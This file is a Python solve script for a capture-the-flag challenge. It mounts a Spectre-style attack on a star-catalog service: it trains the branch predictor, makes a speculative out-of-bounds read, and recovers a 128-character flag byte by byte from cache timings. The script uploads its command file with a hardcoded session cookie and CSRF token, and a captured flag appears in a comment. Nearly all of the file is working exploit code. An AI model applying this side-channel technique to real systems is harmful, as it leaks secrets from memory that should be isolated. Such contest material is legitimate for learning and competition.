#!/usr/bin/env python3
import os
from io import BytesIO, TextIOWrapper
from contextlib import closing
import re
from subprocess import check_call, check_output
from time import sleep

import click
import requests


class Writer:
    def __init__(self):
        self.path = "cmds.txt"
        self.fp = open(self.path, "w")

    def close(self):
        self.fp.close()

    def clear_sequence(self):
        self.fp.write("0\n")

    def disable_timing(self):
        self.fp.write("2\n")

    def enable_timing(self):
        self.fp.write("3\n")

    def execute_star_in_sequence(self, seq_i):
        self.fp.write(f"4\n{seq_i}\n")

    def execute_star(self, star_i):
        self.fp.write(f"5\n{star_i}\n")

    def modify_sequence(self, seq_i, star_i):
        self.fp.write(f"6\n{seq_i}\n{star_i}\n")

    def execute_sequence_multi(self, seq_indices):
        self.fp.write(f"7\n{' '.join(map(str, seq_indices))}\n")


N_REPETITIONS = 512
FLAG_CHARS = range(0x20, 0x80)  # printable
FLAG_LENGTH = 128


def _analyze(results):
    fp = TextIOWrapper(BytesIO(results))
    lineno = 0

    def readline():
        nonlocal lineno
        line = fp.readline().strip()
        lineno += 1
        print(f"{lineno} {line}")
        return line

    def read_elapsed():
        line = readline()
        assert line.startswith("Elapsed: "), line
        return int(line[9:])

    assert readline() == "Loading star catalog"
    assert readline() == "Loaded"
    dts = [{chr(c): [] for c in FLAG_CHARS} for _ in range(FLAG_LENGTH)]
    for _ in range(N_REPETITIONS):
        for i in range(FLAG_LENGTH):
            clear_seq_dt = read_elapsed()
            assert clear_seq_dt > 2000000, clear_seq_dt
            for c in FLAG_CHARS:
                # execute_star_in_sequence() throws, so no output
                dts[i][chr(c)].append(read_elapsed())
    for i in range(FLAG_LENGTH):
        for c in FLAG_CHARS:
            # median is better than mean and average
            dts[i][chr(c)] = sorted(dts[i][chr(c)])[len(dts[i][chr(c)]) // 2]
    flag = ""
    for i in range(FLAG_LENGTH):
        prob = sorted(list(dts[i].items()), key=lambda c_dts: c_dts[1])
        flag += prob[0][0]
    print(flag)


@click.group()
def solve_it():
    pass


@solve_it.command()
def go():
    with closing(Writer()) as w:
        w.disable_timing()
        for i in range(256):
            w.modify_sequence(i, 0)
        w.enable_timing()
        for _ in range(N_REPETITIONS):
            for flag_i in range(FLAG_LENGTH):
                # Clear caches.
                w.clear_sequence()
                # Train branch prediction.
                w.disable_timing()
                w.execute_sequence_multi([0] * 128)
                w.enable_timing()
                # Speculative OOB.
                w.execute_star_in_sequence(256 + flag_i)
                # Check which star was accessed speculatively.
                for c in FLAG_CHARS:
                    w.execute_star(c)
    check_call(["bzip2", "-9", "-f", "cmds.txt", "-k", "-z"])

    form_url = "https://spectrel-cuz4iele.eames.satellitesabove.me/sub/_new"
    print(f"=== Getting CSRF token from {form_url} ===")
    lounge_key = "SFMyNTY.g3QAAAACbQAAAAtfY3NyZl90b2tlbm0AAAAYbTZuN3c4MFFfMnJoOWItd3YyWTdlNVhWbQAAAAZ0aWNrZXRtAAAAWnRpY2tldHt6dWx1NjQwMDI3enVsdTQ6R0xMVWQ4NEhITDhtaVd5c2tmbVgwTmVGQ1FpWWpVbDAxQ0M4TDZlNTFYQmNWRWhKUkRudmE4NGVYeXdHQTUtQnNnfQ.4OFk9jQ0nvtvL0qcJm4xxvC0VVgGg6E6mJpXcO4h7zg"
    response = requests.get(
        form_url,
        cookies={
            "_lounge_key": lounge_key,
        },
    )
    response.raise_for_status()
    match = re.search(
        r"<meta name=\"csrf-token\" content=\"([^\"]+)\">", response.content.decode()
    )
    (csrf_token,) = match.groups()

    upload_url = "https://spectrel-cuz4iele.eames.satellitesabove.me/sub?detailer=file"
    print(f"=== Uploading to {upload_url} with {csrf_token} ===")
    response = requests.post(
        upload_url,
        data={
            "_csrf_token": csrf_token,
        },
        cookies={
            "_lounge_key": lounge_key,
        },
        files={
            "submission[content]": (
                "cmds.txt.bz2",
                open("cmds.txt.bz2", "rb"),
                "application/x-bzip",
            ),
        },
    )
    response.raise_for_status()

    results_url = response.url
    print(f"=== Waiting for results at {results_url} ===")
    while True:
        match = re.search(
            r"<a href=\"/([^\"]+)/stdout\">download stdout</a>",
            response.content.decode(),
        )
        if match is not None:
            break
        sleep(1)
        response = requests.get(results_url, cookies={"_lounge_key": lounge_key})
    (sub_path,) = match.groups()
    os.rename("cmds.txt", sub_path)
    stdout_url = f"https://spectrel-cuz4iele.eames.satellitesabove.me/{sub_path}/stdout"

    print(f"=== Downloading results from {stdout_url} ===")
    response = requests.get(stdout_url, cookies={"_lounge_key": lounge_key})
    response.raise_for_status()
    results = check_output(["bzip2", "-d"], input=response.content)
    with open(sub_path + ".out", "wb") as fp:
        fp.write(results)

    print(f"=== Analyzing results ===")
    _analyze(results)
    # flag{zulu640027zulu4:GGW8mm1ZmUx6uaYz_msvYmLsg4u1uX3AORLf9ngFf-_Pdhx7R5TDKxBUyR4ZmFyAAr7hZGLoOd0rdX4vhf2bjMM}


@solve_it.command()
@click.argument("sub_id")
def analyze(sub_id):
    with open(f"sub/{sub_id}.out", "rb") as fp:
        _analyze(fp.read())


if __name__ == "__main__":
    solve_it()
